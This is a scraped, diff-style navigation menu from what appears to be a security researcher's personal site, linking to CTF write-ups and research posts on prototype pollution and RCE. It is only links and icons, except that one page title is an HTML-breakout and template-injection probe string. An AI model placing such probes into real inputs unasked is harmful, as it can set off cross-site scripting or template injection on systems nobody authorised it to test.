+<li><img src="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZHZtUncgRldHaklkIiB2aWV3Ym94PSIwIDAgMjQgMjQiIHN0cm9rZT0iY3VycmVudENvbG9yIiBqc25hbWU9IkhJSDJWIiBmb2N1c2FibGU9ImZhbHNlIj48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSg5LjcsMTIpIHJvdGF0ZSg0NSkiPjxwYXRoIGNsYXNzPSJLNEI4WSIgZD0iTS00LjIgMCBMNC4yIDAiIHN0cm9rZS13aWR0aD0iMiIgLz48L2c+PGcgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMTQuMywxMikgcm90YXRlKC00NSkiPjxwYXRoIGNsYXNzPSJNcllNeCIgZD0iTS00LjIgMCBMNC4yIDAiIHN0cm9rZS13aWR0aD0iMiIgLz48L2c+PC9zdmc+" alt="">{.dvmRw
+.FWGjId}
+<a href="/research">Research</a>{.aJHbb .dk90Ob .hDrhEe .HlqNPb jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; aria-expanded=&ldquo;true&rdquo;
+aria-haspopup=&ldquo;true&rdquo; url=&quot;/research&quot; data-type=&ldquo;1&rdquo; level=&ldquo;1&rdquo;}
+<ul>
+<li><a href="/research/cookie-tossing-to-rce-on-google-cloud-jupyter-notebooks">Cookie Tossing to RCE on Google Cloud Jupyter
+Notebooks</a>{.aJHbb
+.hDrhEe .HlqNPb jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo;
+navtype=&ldquo;1&rdquo;
+url=&quot;/research/cookie-tossing-to-rce-on-google-cloud-jupyter-notebooks&quot;
+data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+<li><a href="/research/testtest77">test'&gt;&quot;&gt;test{{7*7}}</a>{.aJHbb .hDrhEe
+.HlqNPb jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/research/testtest77&quot; data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+<li><a href="/research/PP">Prototype Pollution</a>{.aJHbb .hDrhEe .HlqNPb
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/research/PP&quot; data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+<li><a href="/research/brokenconflu">BrokenConflu</a>{.aJHbb .hDrhEe .HlqNPb
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+aria-selected=&ldquo;true&rdquo; url=&quot;/research/brokenconflu&quot; data-type=&ldquo;1&rdquo;
+level=&ldquo;2&rdquo;}</li>
+</ul>
+</li>
+<li><img src="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZHZtUnciIHZpZXdib3g9IjAgMCAyNCAyNCIgc3Ryb2tlPSJjdXJyZW50Q29sb3IiIGpzbmFtZT0iSElIMlYiIGZvY3VzYWJsZT0iZmFsc2UiPjxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDkuNywxMikgcm90YXRlKDQ1KSI+PHBhdGggY2xhc3M9Iks0QjhZIiBkPSJNLTQuMiAwIEw0LjIgMCIgc3Ryb2tlLXdpZHRoPSIyIiAvPjwvZz48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxNC4zLDEyKSByb3RhdGUoLTQ1KSI+PHBhdGggY2xhc3M9Ik1yWU14IiBkPSJNLTQuMiAwIEw0LjIgMCIgc3Ryb2tlLXdpZHRoPSIyIiAvPjwvZz48L3N2Zz4=" alt="">{.dvmRw}
+<a href="/about-me">About Me</a>{.aJHbb .dk90Ob .hDrhEe .HlqNPb jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; aria-expanded=&ldquo;false&rdquo;
+aria-haspopup=&ldquo;true&rdquo; url=&quot;/about-me&quot; data-type=&ldquo;1&rdquo; level=&ldquo;1&rdquo;}
+<ul>
+<li><a href="/about-me/Looking-Back-Looking-Forward">Looking Back Looking Forward:
+2021</a>{.aJHbb .hDrhEe
+.HlqNPb jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/about-me/Looking-Back-Looking-Forward&quot; data-type=&ldquo;1&rdquo;
+level=&ldquo;2&rdquo;}</li>
+</ul>
+</li>
+<li><a href="/inspiration">Inspiration</a>{.aJHbb .dk90Ob .hDrhEe .HlqNPb
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/inspiration&quot; data-type=&ldquo;1&rdquo; level=&ldquo;1&rdquo;}</li>
+</ul>
+<p><a href="/home"><img src="https://lh5.googleusercontent.com/-oZZhZc9Pzr-nQYzLLJKOOnQOPilv9vMC45HKARYGOqlI_koFYOw63xvcNn-Dt284RgUCmh-Gy261Ul7XwSwd-A=w16383" alt="">{.lzy1Td
+role=&ldquo;img&rdquo; aria-label=&ldquo;Site home&rdquo; jsname=&ldquo;SwcDWb&rdquo;}s1r1us</a>{.GAuSPc
+jsname=&ldquo;jIujaf&rdquo;}</p>
+<ul>
+<li><a href="/home">Home</a>{.aJHbb .dk90Ob .jgXgSe .HlqNPb jscontroller=&ldquo;yUHiM&rdquo;
+jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo;
+navtype=&ldquo;1&rdquo; url=&quot;/home&quot; data-type=&ldquo;1&rdquo; level=&ldquo;1&rdquo;}</li>
+<li><a href="/questions">Questions</a>{.aJHbb .dk90Ob .jgXgSe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; aria-expanded=&ldquo;false&rdquo;
+aria-haspopup=&ldquo;true&rdquo; url=&quot;/questions&quot; data-type=&ldquo;1&rdquo; level=&ldquo;1&rdquo;}
+<img src="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZHZtUnciIHZpZXdib3g9IjAgMCAyNCAyNCIgc3Ryb2tlPSJjdXJyZW50Q29sb3IiIGpzbmFtZT0iSElIMlYiIGZvY3VzYWJsZT0iZmFsc2UiPjxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDkuNywxMikgcm90YXRlKDQ1KSI+PHBhdGggY2xhc3M9Iks0QjhZIiBkPSJNLTQuMiAwIEw0LjIgMCIgc3Ryb2tlLXdpZHRoPSIyIiAvPjwvZz48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxNC4zLDEyKSByb3RhdGUoLTQ1KSI+PHBhdGggY2xhc3M9Ik1yWU14IiBkPSJNLTQuMiAwIEw0LjIgMCIgc3Ryb2tlLXdpZHRoPSIyIiAvPjwvZz48L3N2Zz4=" alt="">{.dvmRw}
+<ul>
+<li><a href="/questions/why-much-of-science-progress-happened-in-west">why much of science progress happened in
+west?</a>{.aJHbb
+.hDrhEe .HlqNPb jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo;
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/questions/why-much-of-science-progress-happened-in-west&quot;
+data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+<li><a href="/questions/my-curse-of-curiosity-and-the-problem-of-choice">my curse of curiosity and the problem of
+choice</a>{.aJHbb
+.hDrhEe .HlqNPb jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo;
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/questions/my-curse-of-curiosity-and-the-problem-of-choice&quot;
+data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+</ul>
+</li>
+<li><a href="/books">Books</a>{.aJHbb .dk90Ob .jgXgSe .HlqNPb jscontroller=&ldquo;yUHiM&rdquo;
+jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo;
+navtype=&ldquo;1&rdquo; url=&quot;/books&quot; data-type=&ldquo;1&rdquo; level=&ldquo;1&rdquo;}</li>
+<li><a href="/advisories">Advisories</a>{.aJHbb .dk90Ob .jgXgSe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; url=&quot;/advisories&quot; data-type=&ldquo;1&rdquo;
+level=&ldquo;1&rdquo;}</li>
+<li><a href="/CTF">CTF</a>{.aJHbb .dk90Ob .jgXgSe .HlqNPb jscontroller=&ldquo;yUHiM&rdquo;
+jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo;
+navtype=&ldquo;1&rdquo; aria-expanded=&ldquo;false&rdquo; aria-haspopup=&ldquo;true&rdquo; url=&quot;/CTF&quot;
+data-type=&ldquo;1&rdquo; level=&ldquo;1&rdquo;}
+<img src="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZHZtUnciIHZpZXdib3g9IjAgMCAyNCAyNCIgc3Ryb2tlPSJjdXJyZW50Q29sb3IiIGpzbmFtZT0iSElIMlYiIGZvY3VzYWJsZT0iZmFsc2UiPjxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDkuNywxMikgcm90YXRlKDQ1KSI+PHBhdGggY2xhc3M9Iks0QjhZIiBkPSJNLTQuMiAwIEw0LjIgMCIgc3Ryb2tlLXdpZHRoPSIyIiAvPjwvZz48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxNC4zLDEyKSByb3RhdGUoLTQ1KSI+PHBhdGggY2xhc3M9Ik1yWU14IiBkPSJNLTQuMiAwIEw0LjIgMCIgc3Ryb2tlLXdpZHRoPSIyIiAvPjwvZz48L3N2Zz4=" alt="">{.dvmRw}
+<ul>
+<li><a href="/CTF/bountycon2020">BountyCon 2020</a>{.aJHbb .hDrhEe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; url=&quot;/CTF/bountycon2020&quot;
+data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+<li><a href="/CTF/h1-2006-ctf">H1-2006-CTF</a>{.aJHbb .hDrhEe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; url=&quot;/CTF/h1-2006-ctf&quot;
+data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+<li><a href="/CTF/hack-lu">Hack.lu</a>{.aJHbb .hDrhEe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; url=&quot;/CTF/hack-lu&quot;
+data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+<li><a href="/CTF/facebook-ctf19-writeup">Facebook CTF'19 writeup</a>{.aJHbb
+.hDrhEe .HlqNPb jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo;
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/CTF/facebook-ctf19-writeup&quot; data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+<li><a href="/CTF/csaw19-ctf">CSAW'19 CTF</a>{.aJHbb .hDrhEe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; url=&quot;/CTF/csaw19-ctf&quot;
+data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+<li><a href="/CTF/tangled_browsers">tangled_browsers</a>{.aJHbb .hDrhEe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; url=&quot;/CTF/tangled_browsers&quot;
+data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+<li><a href="/CTF/bytebandits-ctf-2020">ByteBandits CTF 2020</a>{.aJHbb .hDrhEe
+.HlqNPb jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo;
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/CTF/bytebandits-ctf-2020&quot; data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+<li><a href="/CTF/IuseBing">Google CTF - 2020</a>{.aJHbb .hDrhEe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; url=&quot;/CTF/IuseBing&quot;
+data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+<li><a href="/CTF/zer0ptsctf2021-challenges">zer0ptsCTF2021-challenges</a>{.aJHbb
+.hDrhEe .HlqNPb jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo;
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/CTF/zer0ptsctf2021-challenges&quot; data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+<li><a href="/CTF/site-isolation">site-isolation</a>{.aJHbb .hDrhEe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; url=&quot;/CTF/site-isolation&quot;
+data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+<li><a href="/CTF/bsidesahm2021">BsidesAHM2021</a>{.aJHbb .hDrhEe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; url=&quot;/CTF/bsidesahm2021&quot;
+data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+</ul>
+</li>
+<li><a href="/research">Research</a>{.aJHbb .dk90Ob .jgXgSe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; aria-expanded=&ldquo;false&rdquo;
+aria-haspopup=&ldquo;true&rdquo; url=&quot;/research&quot; data-type=&ldquo;1&rdquo; level=&ldquo;1&rdquo;}
+<img src="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZHZtUnciIHZpZXdib3g9IjAgMCAyNCAyNCIgc3Ryb2tlPSJjdXJyZW50Q29sb3IiIGpzbmFtZT0iSElIMlYiIGZvY3VzYWJsZT0iZmFsc2UiPjxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDkuNywxMikgcm90YXRlKDQ1KSI+PHBhdGggY2xhc3M9Iks0QjhZIiBkPSJNLTQuMiAwIEw0LjIgMCIgc3Ryb2tlLXdpZHRoPSIyIiAvPjwvZz48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxNC4zLDEyKSByb3RhdGUoLTQ1KSI+PHBhdGggY2xhc3M9Ik1yWU14IiBkPSJNLTQuMiAwIEw0LjIgMCIgc3Ryb2tlLXdpZHRoPSIyIiAvPjwvZz48L3N2Zz4=" alt="">{.dvmRw}
+<ul>
+<li><a href="/research/cookie-tossing-to-rce-on-google-cloud-jupyter-notebooks">Cookie Tossing to RCE on Google Cloud Jupyter
+Notebooks</a>{.aJHbb
+.hDrhEe .HlqNPb jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo;
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/research/cookie-tossing-to-rce-on-google-cloud-jupyter-notebooks&quot;
+data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+<li><a href="/research/testtest77">test'&gt;&quot;&gt;test{{7*7}}</a>{.aJHbb .hDrhEe
+.HlqNPb jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo;
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/research/testtest77&quot; data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+<li><a href="/research/PP">Prototype Pollution</a>{.aJHbb .hDrhEe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; url=&quot;/research/PP&quot;
+data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+<li><a href="/research/brokenconflu">BrokenConflu</a>{.aJHbb .hDrhEe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; aria-selected=&ldquo;true&rdquo;
+url=&quot;/research/brokenconflu&quot; data-type=&ldquo;1&rdquo; level=&ldquo;2&rdquo;}</li>
+</ul>
+</li>
+<li><a href="/about-me">About Me</a>{.aJHbb .dk90Ob .jgXgSe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; aria-expanded=&ldquo;false&rdquo;
+aria-haspopup=&ldquo;true&rdquo; url=&quot;/about-me&quot; data-type=&ldquo;1&rdquo; level=&ldquo;1&rdquo;}
+<img src="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZHZtUnciIHZpZXdib3g9IjAgMCAyNCAyNCIgc3Ryb2tlPSJjdXJyZW50Q29sb3IiIGpzbmFtZT0iSElIMlYiIGZvY3VzYWJsZT0iZmFsc2UiPjxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDkuNywxMikgcm90YXRlKDQ1KSI+PHBhdGggY2xhc3M9Iks0QjhZIiBkPSJNLTQuMiAwIEw0LjIgMCIgc3Ryb2tlLXdpZHRoPSIyIiAvPjwvZz48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxNC4zLDEyKSByb3RhdGUoLTQ1KSI+PHBhdGggY2xhc3M9Ik1yWU14IiBkPSJNLTQuMiAwIEw0LjIgMCIgc3Ryb2tlLXdpZHRoPSIyIiAvPjwvZz48L3N2Zz4=" alt="">{.dvmRw}
+<ul>
+<li><a href="/about-me/Looking-Back-Looking-Forward">Looking Back Looking Forward:
+2021</a>{.aJHbb .hDrhEe
+.HlqNPb jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo;
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/about-me/Looking-Back-Looking-Forward&quot; data-type=&ldquo;1&rdquo;
+level=&ldquo;2&rdquo;}</li>
+</ul>
+</li>
+<li><a href="/inspiration">Inspiration</a>{.aJHbb .dk90Ob .jgXgSe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; url=&quot;/inspiration&quot;
+data-type=&ldquo;1&rdquo; level=&ldquo;1&rdquo;}</li>
+<li>[More]{.aJHbb .dk90Ob .jgXgSe .HlqNPb jscontroller=&ldquo;yUHiM&rdquo;
+jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo;
+navtype=&ldquo;1&rdquo; aria-expanded=&ldquo;false&rdquo; aria-haspopup=&ldquo;true&rdquo; level=&ldquo;1&rdquo;}
+<img src="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZHZtUnciIHZpZXdib3g9IjAgMCAyNCAyNCIgc3Ryb2tlPSJjdXJyZW50Q29sb3IiIGpzbmFtZT0iSElIMlYiIGZvY3VzYWJsZT0iZmFsc2UiPjxnIHRyYW5zZm9ybT0idHJhbnNsYXRlKDkuNywxMikgcm90YXRlKDQ1KSI+PHBhdGggY2xhc3M9Iks0QjhZIiBkPSJNLTQuMiAwIEw0LjIgMCIgc3Ryb2tlLXdpZHRoPSIyIiAvPjwvZz48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxNC4zLDEyKSByb3RhdGUoLTQ1KSI+PHBhdGggY2xhc3M9Ik1yWU14IiBkPSJNLTQuMiAwIEw0LjIgMCIgc3Ryb2tlLXdpZHRoPSIyIiAvPjwvZz48L3N2Zz4=" alt="">{.dvmRw}
+<ul>
+<li><a href="/home">Home</a>{.aJHbb .hDrhEe .HlqNPb jscontroller=&ldquo;yUHiM&rdquo;
+jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo;
+navtype=&ldquo;1&rdquo; url=&quot;/home&quot; data-type=&ldquo;1&rdquo; in-more-submenu=&ldquo;true&rdquo;
+level=&ldquo;2&rdquo;}</li>
+<li><img src="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZHZtUnciIHZpZXdib3g9IjAgMCAyNCAyNCIganNuYW1lPSJISUgyViIgZm9jdXNhYmxlPSJmYWxzZSI+PHBhdGggZD0iTTcgMTBsNSA1IDUtNXoiIGZpbGw9ImN1cnJlbnRDb2xvciIgLz48cGF0aCBkPSJNNCA0aDE2djE2SDR6IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgLz48cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIiAvPjwvc3ZnPg==" alt="">{.dvmRw}
+<a href="/questions">Questions</a>{.aJHbb .hDrhEe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; aria-expanded=&ldquo;false&rdquo;
+aria-haspopup=&ldquo;true&rdquo; url=&quot;/questions&quot; data-type=&ldquo;1&rdquo;
+in-more-submenu=&ldquo;true&rdquo; level=&ldquo;2&rdquo;}
+<ul>
+<li><a href="/questions/why-much-of-science-progress-happened-in-west">why much of science progress happened in
+west?</a>{.aJHbb
+.hDrhEe .HlqNPb jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo;
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/questions/why-much-of-science-progress-happened-in-west&quot;
+data-type=&ldquo;1&rdquo; in-more-submenu=&ldquo;true&rdquo; level=&ldquo;3&rdquo;}</li>
+<li><a href="/questions/my-curse-of-curiosity-and-the-problem-of-choice">my curse of curiosity and the problem of
+choice</a>{.aJHbb
+.hDrhEe .HlqNPb jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo;
+jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/questions/my-curse-of-curiosity-and-the-problem-of-choice&quot;
+data-type=&ldquo;1&rdquo; in-more-submenu=&ldquo;true&rdquo; level=&ldquo;3&rdquo;}</li>
+</ul>
+</li>
+<li><a href="/books">Books</a>{.aJHbb .hDrhEe .HlqNPb jscontroller=&ldquo;yUHiM&rdquo;
+jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo;
+navtype=&ldquo;1&rdquo; url=&quot;/books&quot; data-type=&ldquo;1&rdquo; in-more-submenu=&ldquo;true&rdquo;
+level=&ldquo;2&rdquo;}</li>
+<li><a href="/advisories">Advisories</a>{.aJHbb .hDrhEe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; url=&quot;/advisories&quot;
+data-type=&ldquo;1&rdquo; in-more-submenu=&ldquo;true&rdquo; level=&ldquo;2&rdquo;}</li>
+<li><img src="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZHZtUnciIHZpZXdib3g9IjAgMCAyNCAyNCIganNuYW1lPSJISUgyViIgZm9jdXNhYmxlPSJmYWxzZSI+PHBhdGggZD0iTTcgMTBsNSA1IDUtNXoiIGZpbGw9ImN1cnJlbnRDb2xvciIgLz48cGF0aCBkPSJNNCA0aDE2djE2SDR6IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgLz48cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIiAvPjwvc3ZnPg==" alt="">{.dvmRw}
+<a href="/CTF">CTF</a>{.aJHbb .hDrhEe .HlqNPb jscontroller=&ldquo;yUHiM&rdquo;
+jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo; role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo;
+navtype=&ldquo;1&rdquo; aria-expanded=&ldquo;false&rdquo; aria-haspopup=&ldquo;true&rdquo;
+url=&quot;/CTF&quot; data-type=&ldquo;1&rdquo; in-more-submenu=&ldquo;true&rdquo; level=&ldquo;2&rdquo;}
+<ul>
+<li><a href="/CTF/bountycon2020">BountyCon 2020</a>{.aJHbb .hDrhEe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo;
+url=&quot;/CTF/bountycon2020&quot; data-type=&ldquo;1&rdquo;
+in-more-submenu=&ldquo;true&rdquo; level=&ldquo;3&rdquo;}</li>
+<li><a href="/CTF/h1-2006-ctf">H1-2006-CTF</a>{.aJHbb .hDrhEe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
+role=&ldquo;link&rdquo; tabindex=&ldquo;0&rdquo; navtype=&ldquo;1&rdquo; url=&quot;/CTF/h1-2006-ctf&quot;
+data-type=&ldquo;1&rdquo; in-more-submenu=&ldquo;true&rdquo; level=&ldquo;3&rdquo;}</li>
+<li><a href="/CTF/hack-lu">Hack.lu</a>{.aJHbb .hDrhEe .HlqNPb
+jscontroller=&ldquo;yUHiM&rdquo; jsaction=&ldquo;rcuQ6b:WYd;&rdquo; jsname=&ldquo;QwLHlb&rdquo;
